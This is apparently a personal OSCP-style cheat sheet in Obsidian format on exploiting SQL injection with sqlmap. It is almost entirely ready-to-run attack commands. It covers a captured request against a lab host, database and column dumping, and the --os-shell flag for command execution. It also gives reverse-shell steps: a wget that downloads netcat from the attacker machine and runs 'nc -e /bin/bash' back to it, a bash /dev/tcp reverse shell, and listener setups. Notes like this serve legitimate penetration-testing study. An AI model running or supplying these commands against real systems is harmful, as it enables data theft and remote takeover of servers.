To answer all qns with yes
```
--batch
```

speed
```
--batch --threads 10 --level 5 --risk 3 --technique=BEU
```

```
sqlmap -h
```

---
## Using sqlmap

- Captured requests via Burp and modified it.

Copy

```
POST /zm/index.php HTTP/1.1
Host: 192.168.154.52
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1

view=request&request=log&task=query&limit=100&minTime=1466674406.084434
```

Save as req.txt 

```
sqlmap -r req.txt -p limit --dbs --hex --batch --os-shell
```

After getting OS Shell, get reverse shell

Host netcat on KALI ATTACKER
```
cd ~/Desktop/Tools && python3 -m http.server 80
```

Start Penelope listener Port 3305
```
cd ~/Desktop/Tools && python3 penelope.py -p 3305 -O / --oscp-safe
```

On VICTIM HOST OS SHELL
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `wget http://${KaliIP}/nc -O /tmp/nc && chmod +x /tmp/nc && /tmp/nc -e /bin/bash ${KaliIP} 3305`;

dv.paragraph("```bash\n" + command + "\n```");
```





---


```
sqlmap --url="http://localhost/pandora_console/include/chart_generator.php?session_id=''" -- current-db
```

View table header names
```
sqlmap --url="http://localhost/pandora_console/include/chart_generator.php?session_id=''" -D [discoveredtablename] --tables
```

Dumping out the column u want
```
sqlmap --url="http://localhost/pandora_console/include/chart_generator.php?session_id=''" -[headername] --dump
```

Use cookie-editor browser add-on

![[Pasted image 20250528034840.png]]

```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Notes");const ip = page?.IP ?? "NO IP FOUND";

const command = ` sqlmap -u 'http://${ip}/dashboard.php?search=any+query' --cookie="PHPSESSID=7u6p9qbhb44c5c1rsefp4ro8u1"`;

dv.paragraph("```bash\n" + command + "\n```");
```

add flag --os-shell
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Notes");const ip = page?.IP ?? "NO IP FOUND";

const command = ` sqlmap -u 'http://${ip}/dashboard.php?search=any+query' --cookie="PHPSESSID=7u6p9qbhb44c5c1rsefp4ro8u1" --os-shell`;

dv.paragraph("```bash\n" + command + "\n```");
```
turn on netcat

```
sudo nc -lvnp 443
```

upgrade shell
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Notes");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `bash -c "bash -i >& /dev/tcp/${KaliIP}/443 0>&1"`;

dv.paragraph("```bash\n" + command + "\n```");
```

